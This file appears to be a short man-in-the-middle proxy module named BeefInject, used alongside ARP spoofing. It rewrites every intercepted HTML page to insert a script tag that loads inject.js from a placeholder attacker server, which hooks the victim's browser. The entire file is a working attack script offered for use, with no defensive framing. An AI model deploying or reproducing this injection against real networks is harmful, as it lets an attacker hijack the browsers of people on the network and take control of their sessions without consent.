function onLoad() {
  log( "BeefInject loaded." );
  log( "targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
 log( "BeefInject loaded." );
      res.Body = body.replace( 
        '</head>', 
        '<script type="text/javascript" src="http://{SERVER_ADDRESS}/inject.js"></script></head>' 
      ); 
    }
  }
}